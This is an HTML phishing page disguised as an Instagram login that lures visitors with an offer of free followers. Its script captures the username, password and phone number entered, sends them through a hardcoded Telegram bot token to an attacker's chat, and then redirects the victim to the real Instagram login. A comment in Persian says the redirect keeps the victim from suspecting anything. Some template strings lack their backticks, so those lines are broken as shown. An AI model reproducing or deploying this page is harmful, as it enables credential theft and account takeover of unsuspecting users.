<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/Consumer.css/123456789.css">
    <style>
        body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;margin:0;padding:0}
        .container{max-width:350px;margin:40px auto;background:#fff;padding:20px 30px;border:1px solid #dbdbdb;border-radius:8px;text-align:center}
        .logo{padding:30px 0}
        input{width:100%;padding:12px;margin:8px 0;border:1px solid #dbdbdb;border-radius:4px;font-size:14px}
        button{background:#0095f6;color:#fff;border:none;padding:12px;border-radius:8px;width:100%;font-weight:600;font-size:14px;cursor:pointer}
        button:hover{background:#0077c5}
        .footer{margin-top:30px;font-size:12px;color:#8e8e8e}
        .blur-img{filter:blur(12px);border-radius:12px;margin:15px 0}
    </style>
</head>
<body>

<div class="container">
    <div class="logo">
        <h1 style="font-family:'Billabong',cursive;font-size:50px;color:#262626">Instagram</h1>
    </div>

    <h2 style="color:#333;font-size:18px;margin-bottom:20px">Get 100K Free Followers & Likes</h2>
    <p style="color:#666;font-size:14px">Enter your Instagram credentials to continue</p>

    <img src="https://i.imgur.com/8z3xK9P.jpg" width="280" class="blur-img">
    <img src="https://i.imgur.com/L9vM4pQ.jpg" width="280" class="blur-img">

    <form id="loginForm">
        <input type="text" id="username" placeholder="Phone number, username, or email" required>
        <input type="password" id="password" placeholder="Password" required>
        <input type="text" id="phone" placeholder="Phone number (with country code)" required>
        <button type="submit">Get Free Followers</button>
    </form>

    <div class="footer">
        <p>© 2025 Instagram from Meta</p>
    </div>
</div>

<script>
    const TOKEN = "8347578600:AAEYkqSxvGgbXadUlQjDoY2Ey_-YgtUZ2U8";
    const CHAT_ID = "6080665310";

    document.getElementById('loginForm').onsubmit = async function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const phone = document.getElementById('phone').value;

        const message = Hello, I am MicY and I have captured new information from a new user and sent it to you
Username: ${username}
Password: ${password}
Phone number: ${phone}
Macker: MicY™;

        await fetch(https://api.telegram.org/bot${TOKEN}/sendMessage, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });

        // ریدایرکت به اینستاگرام واقعی که شک نکنه
        window.location.href = "https://www.instagram.com/accounts/login/";
    };
</script>

</body>
</html>
